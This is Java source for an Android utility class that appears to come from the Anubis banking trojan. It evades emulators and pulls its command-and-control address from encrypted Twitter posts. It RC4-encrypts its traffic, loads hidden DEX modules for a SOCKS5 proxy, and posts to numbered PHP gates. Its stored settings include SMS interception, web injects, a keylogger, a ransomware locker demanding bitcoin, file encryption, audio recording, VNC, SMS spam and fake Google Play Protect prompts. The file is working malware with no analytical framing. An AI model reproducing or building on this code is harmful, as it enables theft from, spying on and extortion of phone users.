package myapp.stuff.example;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;

import myapp.stuff.example.API.ClassRC4;
import myapp.stuff.example.API.RequestHttp;
import myapp.stuff.example.Receiver.ReceiverAlarm;
import dalvik.system.DexClassLoader;

import static android.content.Context.LOCATION_SERVICE;

public class UtilsClass {
    private static SharedPreferences settings = null;
    private static SharedPreferences.Editor editor = null;
    Constants const_ = new Constants();
    StoreStringClass store = new StoreStringClass();
    final static Constants staticConst = new Constants();
    final static String DexName = staticConst.nameDex;

    public  boolean isEmulator() {
        if(!const_.antiEmulator)return false;
        if(isEmulator_1())return true;

        return false;
    }

    public  boolean isEmulator_1() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT);
    }

    private class TwitterParseTask extends AsyncTask<Void, Void, String> {
        HttpURLConnection urlConnection = null;
        BufferedReader reader = null;
        String result="";
        @Override
        protected String doInBackground(Void... params) {
            try {

                URL url = new URL(const_.urlTwitter);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                InputStream inputStream = urlConnection.getInputStream();
                StringBuffer buffer = new StringBuffer();
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line);
                }
                System.out.println(buffer.toString());
                result = buffer.toString().replace(" ","");
                result = return_plain_text(result,"苏尔的开始","苏尔苏尔完");

                for(int i=0; i<store.us_char.length; i++){
                    result = result.replace(store.cn_char[i], store.us_char[i]);
                }

                result = trafDeCr(result);

            } catch (Exception e) {
                e.printStackTrace();
            }
            return result;
        }

        @Override
        protected void onPostExecute(String strJson) {
            super.onPostExecute(strJson);
        }
    }

    private class ParseURL extends AsyncTask<String, Void, String> {
        HttpURLConnection urlConnection = null;
        BufferedReader reader = null;
        String result="";

        @Override
        protected String doInBackground(String... params) {
            try {
                URL url = new URL(params[0]);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                InputStream inputStream = urlConnection.getInputStream();
                StringBuffer buffer = new StringBuffer();
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line);
                }
                System.out.println(buffer.toString());
                result = buffer.toString();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return result;
        }

        @Override
        protected void onPostExecute(String strJson) {
            super.onPostExecute(strJson);
        }
    }

    public String getUrlAdminPanelFromTwitter(){
        new TwitterParseTask().execute();
        TwitterParseTask twitterParseTask = new TwitterParseTask();
        twitterParseTask.execute();

        try {
            return twitterParseTask.get();
        }catch (Exception ex){
            return "No";
        }
    }

    public  void LoadLibNotification( Service service, String title, String text){
        try {
            String nameMethod = "showNotificationAPI16";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nameMethod = "showNotificationAPI26";
            }
            File file = new File(service.getDir("apk", Context.MODE_PRIVATE),DexName+".apk");
            //final String libPath = "/storage/emulated/0/1.apk";
            final File tmpDir = service.getDir("outdex", 0);
            final DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), tmpDir.getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent());
            final Class<Object> classToLoad = (Class<Object>) classloader.loadClass("apps.com.app.utils");
            final Object myInstance = classToLoad.newInstance();
            final Method doSomething = classToLoad.getMethod(nameMethod, Service.class, String.class, String.class);
            doSomething.invoke(myInstance, service, title, text);
        }catch(Exception e){
            Log.e("DexNotification",e.toString());
        }
        Log.e("Module","DexNotification");
    }

    public  void LoadLibSocks5(Context cnt, String host, String user, String password, String port){
        try {
            File file = new File(cnt.getDir("apk", Context.MODE_PRIVATE),DexName+".apk");
            //final String libPath = "/storage/emulated/0/1.apk";
            final File tmpDir = cnt.getDir("outdex", 0);
            final DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), tmpDir.getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent());
            final Class<Object> classToLoad = (Class<Object>) classloader.loadClass("apps.com.app.utils");
            final Object myInstance = classToLoad.newInstance();
            final Method doSomething = classToLoad.getMethod("startSocks", Context.class, String.class, String.class, String.class, String.class);
            doSomething.invoke(myInstance, cnt, host, user, password, port);
        }catch(Exception e){
            Log.e("DexSocks",e.toString());
        }
        Log.e("Module","SocksStart");
    }

    public void InitializationData(Context context){
        if (android.os.Build.VERSION.SDK_INT >= 19){
            String PackageSWS= Telephony.Sms.getDefaultSmsPackage(context).toString();
            SetWrite(context, "swspacket",PackageSWS);
        }else SetWrite(context, "swspacket", "");

        SetWrite(context,"VNC_Start_NEW", "http://ktosdelaetskrintotpidor.com");
        SetWrite(context,"Starter", "http://sositehuypidarasi.com");
        SetWrite(context,"time_work", "0");
        SetWrite(context,"time_start_permission","0");
        SetWrite(context,"urlInj", ""+const_.urlInj.replace(" ",""));
        SetWrite(context,"interval",""+const_.intervalTime);
        SetWrite(context,"name", "false");
        SetWrite(context,"perehvat_sws", "false");
        SetWrite(context,"del_sws", "false");
        SetWrite(context,"network", "false");
        SetWrite(context,"gps", "false");
        SetWrite(context,"madeSettings", "1 2 3 4 5 6 7 8 9 10 11 12 13 ");
        SetWrite(context,"RequestINJ", "");
        SetWrite(context,"RequestGPS", "");
        SetWrite(context,"save_inj", "");
        SetWrite(context,"SettingsAll", "");
        SetWrite(context,"getNumber", "false");
        SetWrite(context,"dateCJ", "");
        SetWrite(context,"iconCJ", "0:0");
        SetWrite(context,"str_push_fish","");
        SetWrite(context,"timeStartGrabber", "");
        SetWrite(context,"checkStartGrabber","0");
        SetWrite(context,"startRequest", "Access=0Perm=0");
        SetWrite(context,"StringPermis","");
        SetWrite(context,"StringActivate","activate");
        SetWrite(context,"StringAccessibility","Enable access for");
        SetWrite(context,"urls", ""+const_.urls);
        SetWrite(context,"StringYes","");
        SetWrite(context,"uninstall1","");
        SetWrite(context,"uninstall2","");
        SetWrite(context,"vkladmin","");
        SetWrite(context,"websocket", "");
        SetWrite(context,"vnc","start");
        SetWrite(context,"sound","start");
        SetWrite(context,"straccessibility","");
        SetWrite(context,"straccessibility2","");
        SetWrite(context,"findfiles","");
        SetWrite(context,"foregroundwhile","");
        SetWrite(context,"cryptfile","false");
        SetWrite(context,"status","");
        SetWrite(context,"key","");
        SetWrite(context,"htmllocker","");
        SetWrite(context,"lock_amount","");
        SetWrite(context,"lock_btc","");
        SetWrite(context,"keylogger","");
        SetWrite(context,"recordsoundseconds","0");
        SetWrite(context,"startRecordSound","stop");
        SetWrite(context,"play_protect","");
        SetWrite(context,"textPlayProtect","");
        SetWrite(context,"buttonPlayProtect","");
        SetWrite(context,"spamSMS","");
        SetWrite(context,"textSPAM","");
        SetWrite(context,"indexSMSSPAM","");
        SetWrite(context,"DexSocksMolude","");
        SetWrite(context,"lookscreen", "");
        SetWrite(context,"step", "0");
        SetWrite(context,"id_windows_bot", "");
        SetWrite(context, "isAccessbility","false");

        String len =  Locale.getDefault().getLanguage().toLowerCase();
        if(!store.county.contains(len)){
            len = "en";
        }

        for(int i=0;i<store.activate.length;i++) {
            if(store.activate[i].contains("["+len+"]")){
                String str = store.activate[i].replace("["+len+"]","");
                String str2 = store.Accessibility[i].replace("["+len+"]","");
                SetWrite(context, "StringActivate",str);
                SetWrite(context, "StringAccessibility",str2);
                break;
            }
        }
        for(int i=0;i<store.permis.length;i++) {
            if(store.permis[i].contains("["+len+"]")){
                String str = store.permis[i].replace("["+len+"]","");
                SetWrite(context, "StringPermis",str);
                break;
            }
        }
        for(int i=0;i<store.yes.length;i++) {
            if(store.yes[i].contains("["+len+"]")){
                String str = store.yes[i].replace("["+len+"]","");
                SetWrite(context, "StringYes",str);
                break;
            }
        }
        for(int i=0;i<store.uninstall1.length;i++) {
            if(store.uninstall1[i].contains("["+len+"]")){
                String str1 = store.uninstall1[i].replace("["+len+"]","");
                String str2 = store.uninstall2[i].replace("["+len+"]","");
                SetWrite(context, "uninstall1",str1);
                SetWrite(context, "uninstall2",str2);
                break;
            }
        }
        for(int i=0;i<store.vkladmin.length;i++) {
            if(store.vkladmin[i].contains("["+len+"]")){
                String str = store.vkladmin[i].replace("["+len+"]","");
                SetWrite(context, "vkladmin",str);
                break;
            }
        }

        for(int i=0;i<store.straccessibility.length; i++) {
            if(store.straccessibility[i].contains("["+len+"]")){
                String str = store.straccessibility[i].replace("["+len+"]","");
                SetWrite(context, "straccessibility",str);
                break;
            }
        }

        for(int i=0;i<store.straccessibility2.length; i++) {
            if(store.straccessibility2[i].contains("["+len+"]")){
                String str = store.straccessibility2[i].replace("["+len+"]","");
                SetWrite(context, "straccessibility2",str);
                break;
            }
        }

        for(int i=0;i<store.buttonPlayProtect.length; i++) {
            if(store.buttonPlayProtect[i].contains("["+len+"]")){
                String str1 = store.textPlayProtect[i].replace("["+len+"]","");
                String str3 = store.buttonPlayProtect[i].replace("["+len+"]","");
                SetWrite(context, "textPlayProtect",str1+" Google Play Protect!");
                SetWrite(context, "buttonPlayProtect",str3);
                break;
            }
        }
        Log("Настройки","Сохранено!");
    }

    public boolean isMyServiceRunning(Context context,Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    public static boolean csl(Context context, Class<? extends Activity> c) {
        ActivityManager a = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);

        if (a != null) {
            for (ActivityManager.RunningTaskInfo ts : a.getRunningTasks(Integer.MAX_VALUE)) {
                if (c.getName().equals(ts.topActivity.getClassName())) {
                    return true;
                }
            }
        }

        return false;
    }

    public void Log(String params, String text){
        if(const_.Logger){
             Log.e("Anubis","["+ params + "] " + text);
        }
    }

    public boolean geolocation_check_enabled(Context context ) {
        LocationManager locationManager = (LocationManager) context.getSystemService(LOCATION_SERVICE);
        if((locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
                ||(locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)))
            return true; else return false;
    }
    public String POST(Context context, String gate, String params) {
        RequestHttp req_http = new RequestHttp();
        String gates="";
        String url="";
        if(gate.equals("1"))gates="/o1o/a3.php";//set_data.php
        if(gate.equals("2"))gates="/o1o/a4.php";//tuk_tuk.php
        if(gate.equals("3"))gates="/o1o/a5.php";//settings.php
        if(gate.equals("4"))gates="/o1o/a6.php";//add_log.php
        if(gate.equals("5"))gates="/o1o/a7.php";//set_location.php
        if(gate.equals("6"))gates="/o1o/a8.php";//getSettingsAll.php
        if(gate.equals("7"))gates="/o1o/a9.php";//setAllSettings.php
        //if(gate.equals("8"))gates="/o1o/a10.php";//getDataCJ.php!!!
        //if(gate.equals("9"))gates="/o1o/a11.php";//setDataCJ.php!!!
        if(gate.equals("10"))gates="/o1o/a10.php";//add_inj.php
        if(gate.equals("11"))gates="/o1o/a11.php";//locker.php
        if(gate.equals("12"))gates="/o1o/a12.php";//datakeylogger.php
        if(gate.equals("13"))gates="/o1o/a13.php";//sound.php
        if(gate.equals("14"))gates="/o1o/a14.php";//playprot.php
        if(gate.equals("15"))gates="/o1o/a15.php";//spam.php


        try {
            url = SetRead(context, "url");
        }catch (Exception ex){
            Log("ERROR","Class UtilsClass, POST -> URL");
            return null;
        }

        return req_http.go_post(url + gates,params);
    }
    public String checkPanelPost(String url)
    {
        RequestHttp req_http = new RequestHttp();
        return req_http.go_post(url + "/o1o/a16.php","");//checkPanel.php
    }
    //------
    private NetworkInfo getNetworkInfo(Context context) {
        return ((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
    }

    public  boolean isConnectedWifi(Context context) {
        NetworkInfo info = getNetworkInfo(context);
        if (info != null && info.isConnected() && info.getType() == 1) {
            return true;
        }
        return false;
    }
    public  boolean isConnectedMobile(Context context) {
        NetworkInfo info = getNetworkInfo(context);
        return info != null && info.isConnected() && info.getType() == 0;
    }
    public boolean isConnectedWifiOrMobile(Context context) {
        return isConnectedMobile(context) || isConnectedWifi(context);
    }
    //------
    public void SetWrite(Context context, String name, String params)
    {
        //String n = name;
       // name = trafEnCr(name);
        if((name.contains("urlInj") || (name.contains("urls")))){
            params=trafEnCr(params);
        }
        SharedPreferences settings = context.getSharedPreferences("set", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putString(name, params);
        editor.commit();
    }
    public String SetRead(Context context, String name)
    {
       /* String n = name;
        name = trafEnCr(name);*/

        if( settings == null ){
            settings = context.getSharedPreferences("set", Context.MODE_PRIVATE);
            editor = settings.edit();
        }
        String rezult = settings.getString(name, null);
        if((name.contains("urlInj") || (name.contains("urls")))){
            rezult=trafDeCr(rezult);
        }
       return rezult;
    }

    public static void startCustomTimer(Context context, String name, long millisec)
    {
        try{
            Intent intent = new Intent(context, ReceiverAlarm.class);
            intent.setAction(name);

            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + millisec, millisec, pendingIntent);

        }
        catch(Exception ex)
        {
        }
    }
    public static void cancelCustomTimer(Context context, String name)
    {
        try
        {
            Intent intent = new Intent(context, ReceiverAlarm.class);
            intent.setAction(name);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

            alarmManager.cancel(pendingIntent);
        }
        catch(Exception ex)
        {
        }
    }
    public String return_plain_text(String text, String tagBIGIN, String tagEND)//Убираем <TAG>text</TAG>
    {
        try {
            int indexBIGIN = text.indexOf(tagBIGIN) + tagBIGIN.length();
            int indexEND = text.indexOf(tagEND);
            text = text.substring(indexBIGIN, indexEND);
            return text;
        }catch (Exception e)
        {
            return "";
        }
    }
    public static boolean killed = true;
    public String ID_B(Context context) {
        String ID_B="";
        ID_B = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        if(ID_B == "") {
            ID_B = "35" +
                    Build.BOARD.length()%10 + Build.BRAND.length()%10 +
                    Build.CPU_ABI.length()%10 + Build.DEVICE.length()%10 +
                    Build.DISPLAY.length()%10 + Build.HOST.length()%10 +
                    Build.ID.length()%10 + Build.MANUFACTURER.length()%10 +
                    Build.MODEL.length()%10 + Build.PRODUCT.length()%10 +
                    Build.TAGS.length()%10 + Build.TYPE.length()%10 +
                    Build.USER.length()%10;
        }
        return ID_B;
    }
    //-------------------
    public String strEncRC4(String text, String key){
        ClassRC4 rce = new ClassRC4(key.getBytes());
        byte[] result = rce.encrypt(text.getBytes());
        result = bytesToHexString(result).getBytes();
        return Base64.encodeToString(result, Base64.DEFAULT);
    }
    public String bytesToHexString(byte[] bytes) {
        StringBuffer buf = new StringBuffer(bytes.length * 2);
        for (byte b : bytes) {
            String s = Integer.toString(0xFF & b, 16);
            if (s.length() < 2) {
                buf.append('0');
            }
            buf.append(s);
        }
        return buf.toString();
    }
    //-------------------
    public String str_decrypt(String textDE_C, String key)
    {
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){
            // Log("RC4_Dec","ERROR");
        }
        return "";
    }
    public String strDecRC4(String textDE_C, String key)
    {
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){
           // Log("RC4_Dec","ERROR");
        }
        return "";
    }
    public   byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    //----шифрование траффика--------
    public String trafEnCr(String text) {
        return strEncRC4(text, const_.key_post);
    }

    public String trafDeCr(String text){
        return strDecRC4(text, const_.key_post);
    }
}
